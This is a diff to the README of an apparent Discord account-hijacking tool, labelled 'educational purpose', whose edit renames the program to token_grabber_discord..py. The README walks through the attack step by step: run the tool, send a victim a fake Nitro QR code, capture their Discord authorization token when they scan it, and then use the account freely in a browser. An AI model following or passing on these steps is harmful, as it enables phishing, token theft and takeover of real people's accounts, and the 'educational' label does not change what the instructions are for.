@@ -1,7 +1,7 @@
 # DISCORD_ACCOUNT_HACKING_TOOL ( EDUCATIONAL PURPOSE )
 Hack any account sending fake nitro QR code (only for educational purpose)
 
-1. Start my program.
+1. Start my program token_grabber_discord..py 
 2. Wait 10 seconds and then send result.png file to victim (QR code expire in 2 min).
 3. The program will print Discord Authorization Token if victim will scan it. 
 4. You can do what u want in a opened browser with account
